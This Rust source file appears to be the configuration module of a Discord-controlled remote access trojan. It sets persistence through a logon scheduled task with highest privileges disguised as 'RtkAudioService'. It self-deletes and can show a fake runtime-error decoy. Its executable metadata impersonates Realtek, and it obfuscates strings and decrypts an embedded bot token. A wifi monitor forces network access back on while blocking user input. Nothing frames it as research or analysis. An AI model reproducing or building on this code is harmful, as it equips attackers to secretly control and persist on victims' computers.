pub use crate::types::*;
use std::collections::HashSet;

pub struct Config;

include!(concat!(env!("OUT_DIR"), "/encrypted_token.rs"));
const DISCORD_TOKEN_DEV: &str = "";

impl Config {
    pub const GUILD_ID: u64 = 1000000000000000;
    pub const BOT_PREFIX: &'static str = ".";
    pub const MAX_FILE_SIZE_MB: f64 = 10.0;

    pub fn get_startup_config() -> StartupConfig {
        StartupConfig {
            enabled: true,
            task_name: obfstr::obfstr!("RtkAudioService").to_string(),
            on_logon: true,
            highest_privileges: true,
        }
    }

    pub fn get_autodelete_config() -> AutoDeleteConfig {
        AutoDeleteConfig {
            enabled: true,
            delay_ms: 1000,
        }
    }

    pub fn get_decoy_config() -> DecoyConfig {
        DecoyConfig {
            enabled: false,
            title: obfstr::obfstr!("Microsoft Visual C++ Runtime Library").to_string(),
            message: obfstr::obfstr!("Runtime Error!\n\nProgram: C:\\Windows\\System32\\svchost.exe\n\nR6025\n- pure virtual function call").to_string(),
            icon: MessageBoxIcon::Error,
            buttons: MessageBoxButtons::Ok,
        }
    }

    pub fn get_auth_config() -> AuthConfig {
        AuthConfig {
            auth_roles: false,
            allowed_roles: HashSet::from([]),
            auth_user: false,
            allowed_users: HashSet::from([]),
            auth_all: true,
        }
    }

    pub fn get_keep_active_config() -> KeepActiveConfig {
        KeepActiveConfig {
            enabled: true,
            interval_seconds: 60,
        }
    }

    pub fn get_wifi_monitor_config() -> WifiMonitorConfig {
        WifiMonitorConfig {
            enabled: true,
            check_interval_ms: 500,
            re_enable_delay_seconds: 3,
            block_user_input: true,
        }
    }

    pub fn get_webhook_config() -> WebhookConfig {
        WebhookConfig {
            enabled: false,
            url: String::new(),
        }
    }

    pub fn get_build_info() -> BuildInfo {
        BuildInfo {
            file_name: obfstr::obfstr!("RtkAudioService64.exe").to_string(),
            product_name: obfstr::obfstr!("Realtek Audio Service").to_string(),
            description: obfstr::obfstr!("Realtek High Definition Audio Driver Service").to_string(),
            company_name: obfstr::obfstr!("Realtek Semiconductor Corp.").to_string(),
            file_version: "6.0.9561.1".to_string(),
        }
    }

    pub fn get_guildid() -> u64 {
        Self::GUILD_ID
    }

    pub fn get_token() -> String {
        let decrypted = crate::utils::token::decrypt_token(ENCRYPTED_TOKEN, BUILD_SIGNATURE);
        if decrypted.contains("kurinium-bot") {
            DISCORD_TOKEN_DEV.to_string()
        } else {
            decrypted
        }
    }

    pub fn get_exe_name() -> String {
        Self::get_build_info().file_name
    }

    pub fn get_max_bfilesize() -> usize {
        (Self::MAX_FILE_SIZE_MB * 1024.0 * 1024.0) as usize
    }
}

#[cfg(debug_assertions)]
impl Config {
    pub const SHOW_CONSOLE: bool = true;
}

#[cfg(not(debug_assertions))]
impl Config {
    pub const SHOW_CONSOLE: bool = false;
}